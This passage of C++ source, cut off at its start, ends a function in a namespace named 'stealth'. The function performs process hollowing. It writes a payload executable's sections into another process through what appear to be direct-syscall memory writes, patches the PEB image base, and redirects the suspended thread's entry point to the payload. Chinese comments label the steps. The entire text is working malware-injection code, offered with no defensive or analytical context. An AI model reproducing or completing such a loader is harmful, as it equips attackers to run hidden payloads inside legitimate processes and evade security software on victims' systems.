    auto* section = IMAGE_FIRST_SECTION(payloadNt);
    for (int i = 0; i < payloadNt->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData > 0) {
            auto src = reinterpret_cast<const BYTE*>(payload) + section[i].PointerToRawData;
            PVOID dst = reinterpret_cast<BYTE*>(newBase) + section[i].VirtualAddress;
            SysWriteVirtualMemory(hProcess, dst, const_cast<BYTE*>(src),
                section[i].SizeOfRawData, &written);
        }
    }

    // 8. 更新 PEB 中的 ImageBaseAddress
    SysWriteVirtualMemory(hProcess, reinterpret_cast<PVOID>(pebImageBaseAddr),
        &newBase, sizeof(newBase), &written);

    // 9. 设置线程入口点
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);

    // x64: RCX = 入口点 (RtlUserThreadStart 会调用)
    ctx.Rcx = reinterpret_cast<uintptr_t>(newBase) + payloadNt->OptionalHeader.AddressOfEntryPoint;

    SetThreadContext(hThread, &ctx);

    return true;
}

} // namespace stealth
